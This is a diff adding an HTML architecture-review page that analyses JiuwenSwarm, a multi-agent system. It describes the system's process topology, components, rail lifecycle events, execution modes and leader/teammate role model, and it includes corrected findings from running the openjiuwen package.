@@ -1,0 +1,358 @@
+<!doctype html><html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>JiuwenSwarm architecture &middot; AI4RnD &times; JiuwenSwarm</title>
+<link rel="stylesheet" href="style.css">
+</head><body>
+<div class="layout">
+<aside><div class="brand"><svg class="mark" width="20" height="20" viewBox="0 0 20 20" fill="none" aria-hidden="true"><path d="M10 1.6c2.4 2.1 3.6 4.7 3.6 7.4 0 2.9-1.3 5.5-3.6 7.4-2.3-1.9-3.6-4.5-3.6-7.4 0-2.7 1.2-5.3 3.6-7.4z" fill="#cf0a2c"/><path d="M10 16.4c-2.6 1.4-5 1.7-7.2 1-.5-2.2 0-4.4 1.6-6.4 2.2.3 4.1 1.5 5.6 3.5z" fill="#a60822"/><path d="M10 16.4c2.6 1.4 5 1.7 7.2 1 .5-2.2 0-4.4-1.6-6.4-2.2.3-4.1 1.5-5.6 3.5z" fill="#7a0a1d"/></svg><h1>AI4RnD &times; JiuwenSwarm</h1></div>
+<p class="rev">Architecture review &middot; Rev 3</p>
+<div class="navsec">Start</div>
+<a class="doc" href="readme.html">Overview &amp; verdict</a>
+<a class="doc" href="15-correction-log.html">Correction log</a>
+<div class="navsec">Decision</div>
+<a class="doc" href="17-taskgraph-verdict.html">TaskGraph verdict</a>
+<a class="doc" href="19-product-layers-and-ux.html">Product layers &amp; UX</a>
+<a class="doc" href="07-architecture-options.html">Architecture options</a>
+<a class="doc" href="08-recommended-architecture.html">Recommended architecture</a>
+<a class="doc" href="18-evolution-governance.html">Evolution governance</a>
+<a class="doc" href="09-implementation-plan.html">Staged path</a>
+<div class="navsec">Product</div>
+<a class="doc" href="00-intended-product-model.html">Intended product model</a>
+<a class="doc" href="13-maturity-map.html">Maturity map</a>
+<a class="doc" href="14-reuse-vs-build-map.html">Reuse vs build</a>
+<a class="doc" href="traceability-142-feature-matrix.html">142-feature matrix</a>
+<div class="navsec">Systems</div>
+<a class="doc on" href="01-jiuwenswarm-architecture.html">JiuwenSwarm architecture</a>
+<a class="doc" href="02-ai4rnd-architecture.html">AI4RnD architecture</a>
+<a class="doc" href="03-workflow-traces.html">Workflow traces</a>
+<a class="doc" href="04-component-comparison.html">Component comparison</a>
+<a class="doc" href="05-capability-matrix.html">Capability matrix</a>
+<a class="doc" href="06-integration-challenges.html">Integration challenges</a>
+<div class="navsec">Evidence</div>
+<a class="doc" href="16-jiuwen-execution-mechanisms.html">Jiuwen execution mechanisms</a>
+<a class="doc" href="12-verification-appendix.html">Verification appendix</a>
+<a class="doc" href="11-evidence-appendix.html">Evidence appendix</a>
+<a class="doc" href="10-risks-assumptions-open-questions.html">Risks &amp; open questions</a>
+<a class="doc" href="diagrams-readme.html">Diagram index</a>
+<div class="side-foot">jiuwenswarm @ a98d7ad<br>openjiuwen 0.1.15.post3<br>AI4Research @ d35c511<br>142 features &middot; 19 experiments</div></aside>
+<main><div class="crumb">Systems / 01-jiuwenswarm-architecture.md</div><article><nav class="toc"><div class="toc-h">On this page</div><a class="l2" href="#1-what-it-is">1. What it is</a><a class="l2" href="#2-process-and-component-topology">2. Process and component topology</a><a class="l3" href="#entry-point-inventory">Entry-point inventory</a><a class="l2" href="#3-component-responsibilities">3. Component responsibilities</a><a class="l3" href="#3-1-gateway-jiuwenswarm-gateway-41k-loc">3.1 Gateway (jiuwenswarm/gateway/, ~41k LOC)</a><a class="l3" href="#3-2-e2a-protocol-jiuwenswarm-common-e2a">3.2 E2A protocol (jiuwenswarm/common/e2a/)</a><a class="l3" href="#3-3-agentserver-jiuwenswarm-server-42k-loc">3.3 AgentServer (jiuwenswarm/server/, ~42k LOC)</a><a class="l3" href="#3-4-swarm-assembly-jiuwenswarm-agents-swarm">3.4 Swarm assembly (jiuwenswarm/agents/swarm/)</a><a class="l3" href="#3-5-symphony-jiuwenswarm-symphony-35k-loc">3.5 Symphony (jiuwenswarm/symphony/, ~35k LOC)</a><a class="l3" href="#3-6-auto-harness-jiuwenswarm-agents-harness-common-autoharne">3.6 Auto Harness (jiuwenswarm/agents/harness/common/auto_harness/)</a><a class="l3" href="#3-7-skill-self-evolution-agents-swarm-providers-evolutionrai">3.7 Skill self-evolution (agents/swarm/providers/evolution_rails.py)</a><a class="l3" href="#3-8-memory-agents-harness-common-memory">3.8 Memory (agents/harness/common/memory/)</a><a class="l2" href="#4-execution-model">4. Execution model</a><a class="l3" href="#4-1-the-agent-loop">4.1 The agent loop</a><a class="l3" href="#4-2-rail-lifecycle-the-extension-backbone">4.2 Rail lifecycle — the extension backbone</a><a class="l3" href="#4-3-execution-modes">4.3 Execution modes</a><a class="l2" href="#5-agent-and-worker-model">5. Agent and worker model</a><a class="l2" href="#6-tools-and-skills">6. Tools and skills</a><a class="l2" href="#7-state-and-persistence">7. State and persistence</a><a class="l2" href="#8-verification-and-evaluation">8. Verification and evaluation</a><a class="l2" href="#9-extension-points-ranked-by-usefulness-for-integration">9. Extension points — ranked by usefulness for integration</a><a class="l3" href="#9-1-rail-plugins-the-strongest-out-of-tree-seam">9.1 Rail plugins — the strongest out-of-tree seam ✅</a><a class="l3" href="#9-2-extension-packages-narrow-and-half-closed">9.2 Extension packages — narrow, and half-closed ⚠️</a><a class="l3" href="#9-3-harness-element-manifest-powerful-but-gated-by-config">9.3 Harness element manifest — powerful, but gated by config ⚠️</a><a class="l3" href="#9-4-other-surfaces">9.4 Other surfaces</a><a class="l2" href="#10-security-and-operational-boundaries">10. Security and operational boundaries</a><a class="l3" href="#10-1-tool-permissions">10.1 Tool permissions</a><a class="l3" href="#10-2-sandboxing">10.2 Sandboxing</a><a class="l3" href="#10-3-other-boundaries">10.3 Other boundaries</a><a class="l3" href="#10-4-weak-points">10.4 Weak points</a><a class="l2" href="#11-assessment-as-a-foundation">11. Assessment as a foundation</a></nav><h1 id="jiuwenswarm-architecture"><a class="anchor" href="#jiuwenswarm-architecture" aria-hidden="true">#</a>JiuwenSwarm Architecture</h1>
+<p>Analysed at <code>suraj-subrahmanyan/jiuwenswarm</code> commit <code>a98d7ad</code> (fork of <code>openJiuwen-ai/jiuwenswarm</code>), branch <code>develop</code>, plus <code>openjiuwen==0.1.15.post3</code> installed from PyPI.</p>
+<blockquote><p><strong>Revision 2.</strong> <code>openjiuwen</code> — which holds <code>DeepAgent</code>, the rails, the permission engine and the harness manifest framework — was unavailable in Revision 1, so its behaviour was reported as <em>documented</em>. It is now installed and executed. Three findings change earlier conclusions and are marked <strong>⚠ CORRECTED</strong> below. Full transcripts in <a href="12-verification-appendix.html">12-verification-appendix.md</a>.</p>
+<div class="tw"><table><thead><tr><th>Finding</th><th>Effect</th></tr></thead><tbody><tr><td>Rail lifecycle has <strong>11</strong> events, not 10</td><td>§4.2</td></tr><tr><td>Built-in security rules load <strong>0 rules</strong> in a stock install</td><td>§10.1, §10.4</td></tr><tr><td>Exactly <strong>two</strong> member roles with a <strong>global</strong> permission policy</td><td>§5</td></tr><tr><td>Full test suite: <strong>2,816 passed, 18 skipped, 0 failed</strong></td><td>§11</td></tr></tbody></table></div></blockquote>
+<hr>
+<h2 id="1-what-it-is"><a class="anchor" href="#1-what-it-is" aria-hidden="true">#</a>1. What it is</h2>
+<p>JiuwenSwarm is a multi-agent system distributed as a Python package (<code>jiuwenswarm</code>, version 0.2.3.beta1, Apache-2.0). It runs a set of long-lived processes on a machine — a gateway, an agent server, a web frontend — and exposes agents to users over chat channels (web UI, TUI, desktop app, and a large set of IM platforms). Agents execute in-process as Python objects, not as external CLI processes.</p>
+<p>The critical structural fact: <strong>JiuwenSwarm is not self-contained.</strong> Its agent runtime is the <code>openjiuwen</code> package (pinned <code>openjiuwen==0.1.15.post3</code>), a separate PyPI dependency that is <em>not</em> vendored into this repository. <code>DeepAgent</code>, the ReAct loop, the Rail lifecycle base classes, the task loop controller, the permission engine, the harness manifest framework, and several built-in rails/tools/sub-agents all live there. JiuwenSwarm is the <em>platform layer</em> on top: channels, gateway, session management, skill management, swarm assembly, evolution, Symphony, sandbox integration, and the extension system. <span class="tag">E-J01</span></p>
+<p>This matters for the integration question: roughly half the extension surface an integrator would want to touch is upstream of JiuwenSwarm, in a package this analysis could not read.</p>
+<hr>
+<h2 id="2-process-and-component-topology"><a class="anchor" href="#2-process-and-component-topology" aria-hidden="true">#</a>2. Process and component topology</h2>
+<div class="fig"><pre class="mermaid">flowchart TB
+    subgraph Clients
+        WEB[&quot;Web UI :5173&quot;]
+        TUI[&quot;jiuwenswarm-tui&quot;]
+        DESK[&quot;Desktop app (pywebview)&quot;]
+        IM[&quot;IM platforms&lt;br/&gt;Feishu · WeCom · DingTalk · Telegram&lt;br/&gt;Discord · WhatsApp · WeChat · Xiaoyi&quot;]
+        ACP[&quot;ACP / A2A peers&quot;]
+    end
+
+    subgraph GWP[&quot;Gateway process — jiuwenswarm-gateway&quot;]
+        CM[&quot;ChannelManager&lt;br/&gt;per-platform connectors&quot;]
+        IMP[&quot;im_pipeline&lt;br/&gt;inbound normalisation&quot;]
+        MH[&quot;MessageHandler&lt;br/&gt;3,976 LOC&quot;]
+        SLASH[&quot;Slash command parser&quot;]
+        CRON[&quot;Cron scheduler&quot;]
+        ROUTE[&quot;routing/agent_client&quot;]
+    end
+
+    subgraph ASP[&quot;AgentServer process — jiuwenswarm-agentserver&quot;]
+        WS[&quot;agent_ws_server&lt;br/&gt;WebSocket RPC, 6,938 LOC&quot;]
+        AM[&quot;AgentManager&lt;br/&gt;agent cache + topology&quot;]
+        ADPT[&quot;agent_adapter&lt;br/&gt;interface / interface_deep / interface_code&quot;]
+        TM[&quot;TeamManager&lt;br/&gt;swarm lifecycle&quot;]
+        SM[&quot;SkillManager&lt;br/&gt;4,099 LOC&quot;]
+        SESS[&quot;Session manager / history / metadata&quot;]
+        SYM[&quot;Symphony&lt;br/&gt;skill retrieval + orchestration&quot;]
+        AH[&quot;Auto Harness service&quot;]
+        EXT[&quot;ExtensionManager / Registry&quot;]
+    end
+
+    subgraph OJ[&quot;openjiuwen — external package&quot;]
+        DA[&quot;DeepAgent&lt;br/&gt;ReAct + dual-layer task loop&quot;]
+        RAILS[&quot;Rail lifecycle&quot;]
+        PERM[&quot;Permission engine&lt;br/&gt;tiered policy&quot;]
+        TOOLS[&quot;Built-in tools&quot;]
+        SUBA[&quot;Sub-agents&lt;br/&gt;explore / plan / browser&quot;]
+    end
+
+    subgraph BOX[&quot;jiuwenbox — sandbox&quot;]
+        SBX[&quot;sandbox_manager · bwrap · cgroup&lt;br/&gt;network policy · inference privacy proxy&quot;]
+    end
+
+    WEB &amp; TUI &amp; DESK &amp; IM &amp; ACP --&gt; CM
+    CM --&gt; IMP --&gt; MH --&gt; ROUTE
+    SLASH --&gt; MH
+    CRON --&gt; MH
+    ROUTE --&gt;|&quot;E2A envelope over WS&quot;| WS
+    WS --&gt; AM --&gt; ADPT
+    ADPT --&gt; DA
+    ADPT --&gt; TM
+    ADPT --&gt; SM
+    WS --&gt; SESS
+    ADPT --&gt; SYM
+    WS --&gt; AH
+    WS --&gt; EXT
+    DA --&gt; RAILS &amp; PERM &amp; TOOLS &amp; SUBA
+    ADPT -.-&gt;|&quot;/sandbox enable&quot;| SBX</pre></div>
+<h3 id="entry-point-inventory"><a class="anchor" href="#entry-point-inventory" aria-hidden="true">#</a>Entry-point inventory</h3>
+<p>Declared in <code>pyproject.toml</code> <code>[project.scripts]</code> <span class="tag">E-J02</span>:</p>
+<div class="tw"><table><thead><tr><th>Script</th><th>Role</th></tr></thead><tbody><tr><td><code>jiuwenswarm-start</code></td><td>supervisor that launches the service set</td></tr><tr><td><code>jiuwenswarm-gateway</code></td><td>gateway process</td></tr><tr><td><code>jiuwenswarm-agentserver</code></td><td>agent server process</td></tr><tr><td><code>jiuwenswarm-web</code></td><td>web frontend server</td></tr><tr><td><code>jiuwenswarm-desktop</code></td><td>pywebview desktop shell</td></tr><tr><td><code>jiuwenswarm-acp</code> / <code>jiuwenswarm-acp-chat</code></td><td>ACP protocol connector and CLI</td></tr><tr><td><code>jiuwenswarm-init</code></td><td>workspace initialisation</td></tr><tr><td><code>jiuwenbox</code> / <code>jiuwenbox-server</code></td><td>sandbox CLI and server</td></tr></tbody></table></div>
+<hr>
+<h2 id="3-component-responsibilities"><a class="anchor" href="#3-component-responsibilities" aria-hidden="true">#</a>3. Component responsibilities</h2>
+<h3 id="3-1-gateway-jiuwenswarm-gateway-41k-loc"><a class="anchor" href="#3-1-gateway-jiuwenswarm-gateway-41k-loc" aria-hidden="true">#</a>3.1 Gateway (<code>jiuwenswarm/gateway/</code>, ~41k LOC)</h3>
+<p>Owns everything between an external platform and the agent server.</p>
+<ul><li><strong>ChannelManager</strong> — one connector per platform. Nine IM connectors ship in-tree</li></ul>
+<p>(Feishu 3,440 LOC being the largest), plus web, TUI, desktop, ACP and A2A protocol connectors.</p>
+<ul><li><strong>im_pipeline</strong> — normalises platform-specific inbound payloads.</li><li><strong>MessageHandler</strong> (3,976 LOC) — the gateway's core. Command parsing, session routing,</li></ul>
+<p>join/exit handling, file services.</p>
+<ul><li><strong>Cron scheduler</strong> (<code>gateway/cron/</code>, 1,330 + 517 LOC) — scheduled task system with a</li></ul>
+<p>controller and per-task state.</p>
+<ul><li><strong>Routing</strong> — <code>agent_client.py</code> maintains the WS connection to the agent server;</li></ul>
+<p><code>session_sharing.py</code> handles multi-channel session sharing.</p>
+<h3 id="3-2-e2a-protocol-jiuwenswarm-common-e2a"><a class="anchor" href="#3-2-e2a-protocol-jiuwenswarm-common-e2a" aria-hidden="true">#</a>3.2 E2A protocol (<code>jiuwenswarm/common/e2a/</code>)</h3>
+<p>"Everything-to-Agent". The normalised envelope format between gateway and agent server. <code>E2AEnvelope</code> for requests, <code>E2AResponse</code> for responses, with adapters projecting to and from ACP JSON-RPC and A2A Task/Message/Card. The documentation names <code>models.py</code> as the normative source of truth over the prose spec. <span class="tag">E-J03</span></p>
+<p>The <code>method</code> field is overloaded: gateway-origin methods (<code>chat.send</code>, <code>history.get</code>, <code>chat.interrupt</code>) are internal RPC names, while ACP-origin methods (<code>session/prompt</code>, <code>initialize</code>) are JSON-RPC names. The docs flag this explicitly as a pitfall.</p>
+<h3 id="3-3-agentserver-jiuwenswarm-server-42k-loc"><a class="anchor" href="#3-3-agentserver-jiuwenswarm-server-42k-loc" aria-hidden="true">#</a>3.3 AgentServer (<code>jiuwenswarm/server/</code>, ~42k LOC)</h3>
+<ul><li><strong><code>agent_ws_server.py</code></strong> (6,938 LOC) — WebSocket server. Dispatches on <code>req_method</code></li></ul>
+<p>to ~40 handlers: session list/rename/switch/delete, three rewind variants (full, with file restore, with compaction), history, team snapshot/history/members, permissions config, and slash commands (<code>/add-dir</code>, <code>/chrome</code>, <code>/compact</code>, <code>/context</code>, <code>/recap</code>, <code>/diff</code>, <code>/simplify</code>, <code>/model</code>, <code>/mcp</code>, <code>/sandbox</code>, …). <span class="tag">E-J04</span></p>
+<ul><li><strong><code>runtime/agent_manager.py</code></strong> — caches agents keyed by <code>(mode, sub_mode, project_dir)</code>,</li></ul>
+<p>and maintains agent topology per channel.</p>
+<ul><li><strong><code>runtime/agent_adapter/</code></strong> — the adapter layer between RPC requests and <code>DeepAgent</code>.</li></ul>
+<p><code>interface.py</code> (2,516) is the base, <code>interface_deep.py</code> (8,458) the general agent path, <code>interface_code.py</code> (1,677) the coding-agent path. <code>team_helpers.py</code> (2,731) handles team-mode specifics.</p>
+<ul><li><strong><code>runtime/skill/skill_manager.py</code></strong> (4,099 LOC) — skill install/uninstall/list/search</li></ul>
+<p>across five sources, plus <code>skilldev/</code> (a staged skill-development pipeline with <code>desc_optimize_stage.py</code> and <code>evaluate_stage.py</code>).</p>
+<ul><li><strong><code>runtime/session/</code></strong> — <code>session_manager</code>, <code>session_history</code> (573), <code>session_metadata</code></li></ul>
+<p>(501), <code>session_rename</code>.</p>
+<ul><li><strong><code>sandbox/jiuwenbox_runner.py</code></strong> (493 LOC) — manages a local <code>jiuwenbox</code> uvicorn</li></ul>
+<p>subprocess, triggered by <code>/sandbox enable</code>. <span class="tag">E-J11</span></p>
+<h3 id="3-4-swarm-assembly-jiuwenswarm-agents-swarm"><a class="anchor" href="#3-4-swarm-assembly-jiuwenswarm-agents-swarm" aria-hidden="true">#</a>3.4 Swarm assembly (<code>jiuwenswarm/agents/swarm/</code>)</h3>
+<p>The declarative harness-assembly layer, and the best-documented part of the codebase (<code>DESIGN.md</code>, 15 sections). It converts configuration into a <code>TeamAgentSpec</code> that <code>openjiuwen</code> builds into running agents.</p>
+<p>The model, in the design doc's own words: <em>a team member's capability = a set of declarative specs (<code>RailSpec</code> / <code>BuiltinToolSpec</code> / <code>SubAgentSpec</code>) → openjiuwen resolves by <code>type</code> / <code>factory_name</code> to a swarm provider factory → the factory uses <code>ConstructionInput</code> to extract construction parameters from <code>params</code> (attributes) plus <code>SwarmBuildContext</code> (environment) → produces a runtime object.</em> <span class="tag">E-J05</span></p>
+<div class="fig"><pre class="mermaid">flowchart TB
+    REQ[&quot;Request&lt;br/&gt;(mode, role, channel, session, project_dir, config.yaml)&quot;]
+    ENRICH[&quot;enrich_team_spec_for_swarm()&lt;br/&gt;assembly.py&quot;]
+    SPEC[&quot;TeamAgentSpec&lt;br/&gt;agents: leader / teammate&quot;]
+    DAS[&quot;DeepAgentSpec&lt;br/&gt;rails · tools · subagents&quot;]
+    BUILD[&quot;spec.build(context=SwarmBuildContext)&quot;]
+    FACT[&quot;swarm provider factories&lt;br/&gt;providers/*.py&quot;]
+    OBJ[&quot;Runtime objects&lt;br/&gt;Rail · Tool · SubAgentConfig&quot;]
+
+    REQ --&gt; ENRICH
+    ENRICH --&gt;|&quot;① register_swarm_providers()&lt;br/&gt;② build SwarmBuildContext&lt;br/&gt;③ rewrite member specs&lt;br/&gt;④ attach build_context + seed&quot;| SPEC
+    SPEC --&gt; DAS --&gt; BUILD --&gt; FACT --&gt; OBJ</pre></div>
+<p>Three design principles are stated explicitly:</p>
+<ol><li><strong>Purely declarative assembly</strong> — capabilities are declared as config-sourced provider specs; customizer functions and <code>rail.init</code> post-mounting are forbidden.</li><li><strong>Members share the config source</strong> — members are not derived from a pre-built parent <code>DeepAgent</code>.</li><li><strong>Cross-serialisation-boundary rebuilding via seed</strong> — member spawn, distribution and hot recovery go through <code>build_context_seed</code> plus a registered context factory.</li></ol>
+<p>The <strong>param vs context boundary</strong> is the load-bearing concept: anything derived from <code>config.yaml</code> is an <em>attribute</em> and is baked into <code>RailSpec.params</code> at spec-build time; anything varying per request/session/member is an <em>environment</em> value carried on <code>SwarmBuildContext</code>. The consequence is that <code>DeepAgentSpec</code> round-trips through JSON completely, which is what makes distributed swarm members possible.</p>
+<p>The element catalog is 36 elements: 8 swarm-owned tools, 18 factory rails, 3 class rails, 1 sub-agent, plus 12 referenced from <code>openjiuwen</code> by bare <code>core.*</code> name. <span class="tag">E-J06</span></p>
+<h3 id="3-5-symphony-jiuwenswarm-symphony-35k-loc"><a class="anchor" href="#3-5-symphony-jiuwenswarm-symphony-35k-loc" aria-hidden="true">#</a>3.5 Symphony (<code>jiuwenswarm/symphony/</code>, ~35k LOC)</h3>
+<p>Skill retrieval and orchestration for installations with many skills.</p>
+<ul><li><strong>Retrieval</strong> — builds a local skill <em>tree</em> index; the agent browses branches with</li></ul>
+<p><code>skill_branch_explore</code> / <code>skill_branch_peek</code> rather than having every skill description injected into the prompt.</p>
+<ul><li><strong>Orchestration</strong> — builds a skill <em>score</em> (a graph where an edge means one skill's</li></ul>
+<p>output can feed another's input), then compiles a task goal plus candidate skills into an executable skill chain.</p>
+<ul><li>Supporting subsystems: <code>fingerprint/</code> (I/O-name and data-type normalisation),</li></ul>
+<p><code>indexing/</code>, <code>graph/candidates/</code>, <code>experience/</code> (collector + bank), and a local inference path (<code>retrieval/llm/vllm/</code>, <code>transformers_prefix_cached_generation/</code>).</p>
+<p>Symphony ships as one of the two in-tree extensions, exposing five RPC methods.</p>
+<h3 id="3-6-auto-harness-jiuwenswarm-agents-harness-common-autoharne"><a class="anchor" href="#3-6-auto-harness-jiuwenswarm-agents-harness-common-autoharne" aria-hidden="true">#</a>3.6 Auto Harness (<code>jiuwenswarm/agents/harness/common/auto_harness/</code>)</h3>
+<p>Evaluation-driven self-optimisation of the harness itself — "post-training at the harness layer". Two pipelines:</p>
+<ul><li><strong>Meta Evolve</strong> — research → assess → plan → implement in an isolated git worktree →</li></ul>
+<p>CI verification with auto-fix on failure → commit → open PR → extract learnings. Targets the shared base harness; changes require PR review.</p>
+<ul><li><strong>Extended Evolve</strong> — assess extension gaps → design → parallel build/verify with</li></ul>
+<p>dependency-wave orchestration → merge → user confirmation → hot-load. Produces hot-loadable runtime extension packages, no restart.</p>
+<p>Also includes <code>issue_fix/</code> — scanning and fixing GitCode issues, with a GitCode client, issue state store and matrix store. Driven from the TUI via <code>/auto-harness</code>.</p>
+<p>This is the closest JiuwenSwarm analogue to AI4RnD's evaluation machinery, but note what it optimises: <strong>the harness</strong>, not the <em>correctness of a research result</em>. It is a capability-improvement loop, not a factual-verification gate.</p>
+<h3 id="3-7-skill-self-evolution-agents-swarm-providers-evolutionrai"><a class="anchor" href="#3-7-skill-self-evolution-agents-swarm-providers-evolutionrai" aria-hidden="true">#</a>3.7 Skill self-evolution (<code>agents/swarm/providers/evolution_rails.py</code>)</h3>
+<p>Three rails: <code>swarm.team_skill_evolution</code> and <code>swarm.team_skill_create</code> (leader), <code>swarm.member_skill_evolution</code> (teammate). Evolution signals are detected automatically after tool execution and dialogue completion — execution exceptions and user corrections both count. Records land in <code>evolutions.json</code> inside the skill directory and are loaded with the skill on next use. Manual triggers: <code>/evolve &lt;skill&gt;</code>, <code>/evolve list</code>. Gated by <code>evolution_auto_scan</code>. <span class="tag">E-J13</span></p>
+<h3 id="3-8-memory-agents-harness-common-memory"><a class="anchor" href="#3-8-memory-agents-harness-common-memory" aria-hidden="true">#</a>3.8 Memory (<code>agents/harness/common/memory/</code>)</h3>
+<p><code>MemoryIndexManager</code> (1,224 LOC) maintains a SQLite index with an optional vector table (<code>sqlite-vec</code>, with <code>chromadb</code>, <code>pgvector</code> and <code>faiss-cpu</code> also in the dependency set). It watches memory and session files, re-indexes on change or interval, chunks and embeds content, and serves hybrid vector + keyword search. There is also a <code>dreaming/sweeper.py</code> (797 LOC) — background memory consolidation.</p>
+<p>Separate from this: <code>rails/project_memory/</code> (962 LOC in <code>files.py</code>) for project-scoped memory, and <code>swarm.code_coding_memory</code> for code-aware memory.</p>
+<hr>
+<h2 id="4-execution-model"><a class="anchor" href="#4-execution-model" aria-hidden="true">#</a>4. Execution model</h2>
+<h3 id="4-1-the-agent-loop"><a class="anchor" href="#4-1-the-agent-loop" aria-hidden="true">#</a>4.1 The agent loop</h3>
+<p>Documented in <code>docs/en/Harness.md</code>. <code>DeepAgent</code> has two modes: single-round ReAct for short tasks, and a <strong>dual-layer task loop</strong> for long-running work. The outer loop is composed of <code>TaskLoopController</code>, <code>LoopCoordinator</code>, <code>TaskLoopEventHandler</code>, <code>TaskLoopEventExecutor</code> and <code>LoopQueues</code>; it submits each round as a <code>CoreTask</code>, waits, and evaluates whether another round is needed. <span class="tag">E-J15</span></p>
+<p>Runtime interaction lives at the outer layer:</p>
+<ul><li><code>follow_up</code> — queue a user follow-up for the next round</li><li><code>steer</code> — inject runtime guidance into the current task</li><li><code>abort</code> — cancel the outer loop and attempt to interrupt the inner ReAct loop</li></ul>
+<p>Stop conditions use OR semantics, with built-in evaluators: <code>MaxRoundsEvaluator</code>, <code>TimeoutEvaluator</code>, <code>TokenBudgetEvaluator</code>, <code>CompletionPromiseEvaluator</code>, <code>CustomPredicateEvaluator</code>.</p>
+<blockquote><p>These classes live in <code>openjiuwen</code> and were not read. Behaviour is <strong>documented</strong>, not verified.</p></blockquote>
+<h3 id="4-2-rail-lifecycle-the-extension-backbone"><a class="anchor" href="#4-2-rail-lifecycle-the-extension-backbone" aria-hidden="true">#</a>4.2 Rail lifecycle — the extension backbone</h3>
+<div class="tw"><table><thead><tr><th>Event</th><th>Location</th><th>Typical use</th></tr></thead><tbody><tr><td><code>before_invoke</code> / <code>after_invoke</code></td><td>outer DeepAgent</td><td>initialise resources, load skills, sync external memory</td></tr><tr><td><code>before_task_iteration</code> / <code>after_task_iteration</code></td><td>outer task loop</td><td>rewrite task instructions, sync todo, detect completion promises, trigger evolution</td></tr><tr><td><code>before_model_call</code> / <code>after_model_call</code></td><td>inner ReAct</td><td>assemble prompts, inject safety rules, compress context, collect trajectories</td></tr><tr><td><code>before_tool_call</code> / <code>after_tool_call</code></td><td>inner ReAct</td><td>permission checks, plan-mode restrictions, LSP diagnostics, progress reminders</td></tr><tr><td><code>on_model_exception</code> / <code>on_tool_exception</code></td><td>inner ReAct</td><td>repair context, govern exceptions</td></tr></tbody></table></div>
+<p><strong>⚠ CORRECTED — there are 11 events, not 10.</strong> Executed enumeration of <code>AgentCallbackEvent</code> returns: <code>before_invoke</code>, <code>after_invoke</code>, <code>before_task_iteration</code>, <code>after_task_iteration</code>, <strong><code>after_react_iteration</code></strong>, <code>before_model_call</code>, <code>after_model_call</code>, <code>on_model_exception</code>, <code>before_tool_call</code>, <code>after_tool_call</code>, <code>on_tool_exception</code>. <code>after_react_iteration</code> is absent from the documentation table in <code>docs/en/Harness.md</code>. <span class="tag">V-1</span></p>
+<p>Verified class structure: <code>AgentRail</code> is an ABC at <code>openjiuwen/core/single_agent/rail/base.py:456</code> with <code>priority: int = 50</code> (479), <code>init(self, agent)</code> (481) and <code>uninit(self, agent)</code> (484). <code>DeepAgentRail</code> (<code>openjiuwen/harness/rails/base.py:28</code>) adds only the two task-iteration hooks plus <code>set_workspace</code> / <code>set_sys_operation</code>. <code>get_callbacks()</code> returns only <em>overridden</em> methods.</p>
+<p>A Rail may register and unregister tools on the live agent via <code>agent.ability_manager.add_ability(tool.card, tool)</code> / <code>remove_ability(name)</code>. <code>MemberSkillToolkitRail</code> does exactly this. <span class="tag">E-J10</span></p>
+<p><strong>This is the single most important fact for the integration question, and it is now verified by execution rather than inferred.</strong> An out-of-tree Rail registered a tool, the tool resolved through <code>Runner.resource_mgr</code>, invoking it returned the correct result, and <code>uninit</code> removed it cleanly. <span class="tag">V-2</span></p>
+<p>One implementation detail matters for integration: <code>add_ability</code> branches on <code>card.stateless</code>. Stateful tools (the default) are rewritten to an agent-qualified id <code>f"{name}_{owner_id}"</code> and registered with <code>refresh=True</code>; stateless tools keep a bare id and are added <code>skip_if_exists</code>. A research toolkit holding a service client should be <strong>stateful</strong>.</p>
+<h3 id="4-3-execution-modes"><a class="anchor" href="#4-3-execution-modes" aria-hidden="true">#</a>4.3 Execution modes</h3>
+<p>Three user-selectable modes:</p>
+<div class="tw"><table><thead><tr><th>Mode</th><th>Behaviour</th></tr></thead><tbody><tr><td>Plan</td><td>decompose into concrete steps, execute step by step, confirm each</td></tr><tr><td>Performance</td><td>flexible handling, parallel tasks, fast response</td></tr><tr><td>Swarm (default)</td><td>leader decomposes, assembles a team, multiple specialised agents coordinate</td></tr></tbody></table></div>
+<p>Internally, <code>mode</code> values seen in the swarm assembly code are <code>team</code>, <code>code.team</code> and <code>team.plan</code>; <code>config_specs.py</code> branches its element set on these. <span class="tag">E-J05</span></p>
+<hr>
+<h2 id="5-agent-and-worker-model"><a class="anchor" href="#5-agent-and-worker-model" aria-hidden="true">#</a>5. Agent and worker model</h2>
+<p>An agent in JiuwenSwarm is defined as <strong>identity + tools + skills + memory + workspace</strong>. Identity lives in <code>IDENTITY.md</code> / <code>SOUL.md</code>; the workspace sits under <code>.jiuwenswarm/</code>.</p>
+<p><strong>Swarm mode</strong> gives two roles: <code>leader</code> and <code>teammate</code>. They differ by element set — the leader gets <code>swarm.team_skill_evolution</code> and <code>swarm.team_skill_create</code>, the teammate gets <code>swarm.member_skill_evolution</code>. Otherwise both are assembled from the same config source. Members can be distributed across processes and machines (<code>remote_member_bootstrap.py</code>, 3,019 LOC).</p>
+<p><strong>Sub-agents</strong> are a second delegation axis, used mainly in code mode: <code>core.explore_agent</code>, <code>core.plan_agent</code>, <code>core.browser_agent</code> from <code>openjiuwen</code>, and <code>swarm.code_agent</code> in-tree. Sub-agents isolate context from the parent.</p>
+<p>There is <strong>no notion of a capability advertisement or a capability-based router.</strong> Worker selection is by <em>role</em> (<code>leader</code> / <code>teammate</code>) and configured element set, not by matching a task's required capabilities against a worker's declared ones. This is a substantive difference from AI4RnD.</p>
+<p><strong>⚠ CORRECTED — the role model is thinner than Revision 1 assumed, and it blocks a design the recommendation depended on.</strong> <span class="tag">V-6</span></p>
+<ul><li>There are exactly <strong>two</strong> roles: <code>_MEMBER_ROLES = ("leader", "teammate")</code></li></ul>
+<p>(<code>assembly.py:40</code>).</p>
+<ul><li>Rail <em>composition</em> does differ per role — <code>TEAM_PERMISSION</code> is attached for <code>teammate</code>,</li></ul>
+<p><code>TEAM_PERMISSION_POLICY</code> for <code>leader</code> (<code>config_specs.py:428-442</code>), and skills differ via <code>_resolve_member_skills(config, role)</code> reading <code>config.agents.&lt;role&gt;.skills</code>.</p>
+<ul><li>But permission <em>policy values</em> come from the single global <code>config.permissions</code>. Two</li></ul>
+<p>members cannot be given different rule sets.</p>
+<ul><li>Neither <code>evaluate_tiered_policy</code> nor <code>harness/security/core.py</code> references <code>member</code>,</li></ul>
+<p><code>agent_id</code> or <code>role</code>.</p>
